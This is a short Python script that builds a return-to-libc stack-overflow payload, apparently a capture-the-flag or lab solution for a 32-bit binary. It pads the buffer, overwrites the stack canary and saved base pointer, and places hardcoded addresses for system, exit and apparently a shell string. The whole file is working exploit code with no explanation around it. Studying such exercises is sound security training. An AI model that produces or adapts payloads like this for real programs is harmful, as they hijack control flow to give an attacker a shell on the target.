#! /usr/bin/python

exp = ""

# Fill the buffer and any locals
exp += 16 * 'A'

# Replace the canary
exp += "UUUU"

# Fill the Function args??? and the old base pointer
exp += 12 * 'B'

# 0xf7e3f950: system
exp += "\x50\xf9\xe3\xf7"

# 0xf7e337c0: address of exit function
exp += "\xc0\x37\xe3\xf7"

# 0xf7f5e12b: Address of the string
exp +="\x2b\xe1\xf5\xf7"

print(exp)




